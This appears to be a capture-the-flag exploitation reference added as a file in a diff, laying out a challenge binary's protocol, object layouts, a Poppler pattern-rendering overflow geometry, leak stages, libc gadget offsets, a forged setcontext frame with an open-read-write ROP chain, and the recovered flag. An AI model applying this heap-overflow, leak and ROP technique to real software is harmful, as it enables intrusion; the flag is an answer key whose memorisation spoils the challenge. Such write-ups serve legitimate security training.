@@ -1,0 +1,108 @@
+paperweight analysis reference
+==============================
+
+Executable
+----------
+Architecture: x86-64
+Type: PIE, dynamically linked, stripped C++
+Mitigations: Full RELRO, stack canary, NX, PIE
+Bundled Poppler: libpoppler.so.156
+
+Protocol
+--------
+A || p32(size)             allocate one A-filled chunk, size 1..0x1000
+F || u8(index)             free one of 32 allocation slots
+B || p32(size) || bytes    cache up to 0x2000 bytes
+N                          allocate one 0x100-byte Folio
+P || p32(size) || PDF      render PDF through Poppler
+S                          print min(Folio.length, 0x100) bytes and exit
+T                          install seccomp, call Folio virtual method, exit
+Q                          exit worker
+
+The parent forks five sequential workers. All workers inherit identical
+mappings; child heap mutations are copy-on-write.
+
+Objects
+-------
+Folio+0x00  vptr, initially PIE+0x5bf8
+Folio+0x08  output offset, initially 0x18
+Folio+0x10  output length, initially 0x13
+Folio+0x18  inline "waterlogged logbook"
+
+DiveAnchor+0x00  vptr = PIE+0x5c10
+DiveAnchor+0x08  self-pointer
+DiveAnchor+0x10  0x2000-byte cache-buffer pointer
+DiveAnchor+0x18  "PELAGIC-LEDGER"
+
+Relevant executable offsets
+---------------------------
+PIE+0x2940  virtual dispatch: mov rax,[rdi]; jmp [rax]
+PIE+0x5bf8  normal Folio vtable
+PIE+0x5c10  DiveAnchor vtable
+PIE+0x5ec0  write@GOT
+
+Poppler overflow geometry
+-------------------------
+Pattern XStep:                 82 (0x52)
+Effective horizontal cells:   0x31f3832
+cells * XStep:                0x100000004
+32-bit wrapped extent:        4
+Image width:                  0x2901 bytes
+Useful repeated row:          0x2900 bytes
+Freed runway:                 32 * 0x1010 = 0x20200 bytes
+Line-buffer-to-Folio delta:   0x58c0
+Folio row offset:             0x58c0 % 0x2900 = 0x6c0
+
+Leak stages
+-----------
+1. Folio.offset = -0x20310, Folio.length = -1
+   S leaks DiveAnchor:
+     PIE = leaked_vptr - 0x5c10
+     Folio = leaked_anchor_self + 0x20310
+     cache = leaked qword at DiveAnchor+0x10
+
+2. Folio.offset = (PIE+0x5ec0) - Folio, Folio.length = -1
+   S leaks write@GOT:
+     libc = leaked_write - 0x1148b0
+
+Supplied-libc offsets
+---------------------
+setcontext                0x539e0
+mov rdi,rax; ...; ret     0x5a272
+pop rdi; ret              0x2a3e5
+pop rsi; ret              0x2be51
+pop rdx; pop r12; ret     0x11f327
+openat                    0x1146b0
+read                      0x114810
+write                     0x1148b0
+_exit                     0xeabc0
+
+Forged setcontext fields relative to Folio
+------------------------------------------
++0x00  cache buffer containing libc+setcontext
++0x68  rdi = -100 (AT_FDCWD)
++0x70  rsi = Folio+0x200 ("flag.txt")
++0x88  rdx = 0 (O_RDONLY)
++0xa0  rsp = Folio+0x300 (ROP chain)
++0xa8  rip = libc+openat
++0xe0  floating-point state = Folio+0x400
++0x1c0 MXCSR = 0x1f80
++0x200 "flag.txt\0"
++0x300 ORW ROP chain
++0x800 read buffer
+
+Decoded seccomp allowlist
+-------------------------
+read, write, openat, close, rt_sigprocmask, exit, exit_group
+
+Final operation
+---------------
+fd = openat(AT_FDCWD, "flag.txt", O_RDONLY, 0)
+rdi = fd returned in rax
+read(fd, Folio+0x800, 0x100)
+write(1, Folio+0x800, 0x100)
+_exit(0)
+
+Recovered flag
+--------------
+zdk{ThE_Sc4nlIN3_5AnK_8ELOw_32_bI75}
